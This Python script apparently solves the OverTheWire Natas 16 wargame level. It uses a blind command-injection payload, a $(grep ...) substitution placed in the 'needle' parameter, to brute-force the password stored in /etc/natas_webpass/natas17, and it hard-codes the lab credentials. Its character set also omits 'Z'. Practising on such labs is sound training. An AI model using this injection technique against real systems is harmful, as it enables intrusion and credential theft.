import requests
from requests.auth import HTTPBasicAuth

user = 'natas16'
psswd = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
url = 'http://natas16.natas.labs.overthewire.org/'

possibleCharacters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYS1234567890'
finalPass = ''

print("Starting BRUTE FORCE...")

for i in range(0,32):
	for char in possibleCharacters:
		uri = f"?needle=$(grep -E ^{finalPass}{char}.* /etc/natas_webpass/natas17)hackers"
		r = requests.get(url+uri ,auth=HTTPBasicAuth(user,psswd))
		if "hackers" not in r.text:
			finalPass = finalPass+char
			print(f"PASSWORD: {finalPass}")
			break

